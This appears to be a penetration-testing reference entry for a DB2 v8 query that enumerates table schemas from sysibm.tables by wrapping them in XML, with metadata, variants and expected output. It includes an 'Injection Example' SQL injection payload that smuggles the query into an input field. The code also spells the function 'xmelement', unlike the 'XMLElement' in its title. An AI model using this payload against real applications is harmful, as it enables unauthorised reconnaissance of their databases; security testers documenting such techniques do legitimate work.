---
id: 614c7c08-1f5d-43e1-aab9-068ab1ba1446
name: DB2-Select-XML2Clob-XMLElement-Table-Schema-From-SysIBM-Tables-V8
type: command
executor: sql
data: 'select xml2clob(xmelement(name t, table_schema)) from sysibm.tables'
output: null
created_at: '2023-04-06T03:56:33.116214+00:00'
updated_at: '2023-04-10T20:22:05.851680+00:00'
platforms:
  - Linux
  - Windows
  - Cloud
tags:
  - db2
  - enumeration
  - xml
  - v8
verified: true
validated: true
---

# DB2-Select-XML2Clob-XMLElement-Table-Schema-From-SysIBM-Tables-V8

## Command

```sql
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
```

## Description

This DB2 v8-specific command uses XMLElement to create XML tags around schemas and XML2CLOB to convert to a character large object for full output display. Use CAST to VARCHAR if truncation occurs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| xmelement(name t, table_schema) | Creates XML element with schema value | Built-in |
| xml2clob | Converts XML to CLOB for handling large output | Built-in |
| sysibm.tables | System table view | Built-in |

## Examples

### Basic Usage

```sql
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
```

### With Casting for Display

```sql
select cast(xml2clob(xmelement(name t, table_schema)) as varchar(500)) from sysibm.tables
```

### Injection Example

`'; select xml2clob(xmelement(name t, table_schema)) from sysibm.tables --`

## Expected Output

CLOB XML output:

```xml
<t>SCHEMA1</t><t>SCHEMA2</t>...
```

## Related

- [[procedures/DB2-Schema-Enumeration-via-XML-Serialization]]
- [[commands/DB2-Select-XMLAgg-XMLRow-Table-Schema-From-SysIBM-Tables]]
